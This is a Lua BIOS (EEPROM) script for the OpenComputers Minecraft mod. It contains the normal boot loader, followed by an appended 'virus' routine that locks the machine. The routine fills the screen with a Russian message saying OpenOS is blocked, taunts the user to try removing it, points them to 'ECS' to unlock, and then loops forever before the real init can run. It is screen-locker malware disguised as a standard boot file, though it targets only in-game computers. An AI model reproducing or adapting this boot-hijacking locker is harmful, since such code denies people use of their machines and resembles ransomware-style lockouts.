local component_invoke = component.invoke
function boot_invoke(address, method, ...)
  local result = table.pack(pcall(component_invoke, address, method, ...))
  if not result[1] then
    return nil, result[2]
  else
    return table.unpack(result, 2, result.n)
  end
end

-- backwards compatibility, may remove later
local eeprom = component.list("eeprom")()
computer.getBootAddress = function()
  return boot_invoke(eeprom, "getData")
end
computer.setBootAddress = function(address)
  return boot_invoke(eeprom, "setData", address)
end

do
  local screen = component.list("screen")()
  local gpu = component.list("gpu")()
  if gpu and screen then
    boot_invoke(gpu, "bind", screen)
  end
end
local function tryLoadFrom(address)
  local handle, reason = boot_invoke(address, "open", "/init.lua")
  if not handle then
    return nil, reason
  end
  local buffer = ""
  repeat
    local data, reason = boot_invoke(address, "read", handle, math.huge)
    if not data and reason then
      return nil, reason
    end
    buffer = buffer .. (data or "")
  until not data
  boot_invoke(address, "close", handle)
  return load(buffer, "=init")
end
local init, reason
if computer.getBootAddress() then
  init, reason = tryLoadFrom(computer.getBootAddress())
end
if not init then
  computer.setBootAddress()
  for address in component.list("filesystem") do
    init, reason = tryLoadFrom(address)
    if init then
      computer.setBootAddress(address)
      break
    end
  end
end
if not init then
  error("no bootable medium found" .. (reason and (": " .. tostring(reason)) or ""), 0)
end

---------------------------------------------------------------

local gpu = component.list("gpu")()

local function centerText(mode,coord,text)
  local dlina = unicode.len(text)
  local xSize,ySize = boot_invoke(gpu, "getResolution")

  if mode == "x" then
    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),coord,text)
  elseif mode == "y" then
    boot_invoke(gpu, "set", coord, math.floor(ySize/2),text)
  else
    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),math.floor(ySize/2),text)
  end
end

local textLines = {
  "Поздравляем! Вы стали одним из первых счастливых обладателей вируса на OpenComputers.",
  "Попытайтесь его удалить - посмотрим, что у вас выйдет. ",
  "Ну, а нубикам советую обращаться к ECS для разблокировки компа.",
  " ",
  "Хех)",
}

local function virus()
  local background, foreground = 0x0000AA, 0xCCCCCC
  local xSize, ySize = boot_invoke(gpu, "getResolution")
  boot_invoke(gpu, "setBackground", background)
  boot_invoke(gpu, "fill", 1, 1, xSize, ySize, " ")

  boot_invoke(gpu, "setBackground", foreground)
  boot_invoke(gpu, "setForeground", background)

  local y = math.floor(ySize / 2 - (#textLines + 2) / 2)
  centerText("x", y, " OpenOS заблокирована! ")
  y = y + 2

  boot_invoke(gpu, "setBackground", background)
  boot_invoke(gpu, "setForeground", foreground)

  for i = 1, #textLines do
    centerText("x", y, textLines[i])
    y = y + 1
  end

  while true do
    computer.pullSignal()
  end
end

if gpu then virus() end

----------------------------------

computer.beep(1000, 0.2)
init()























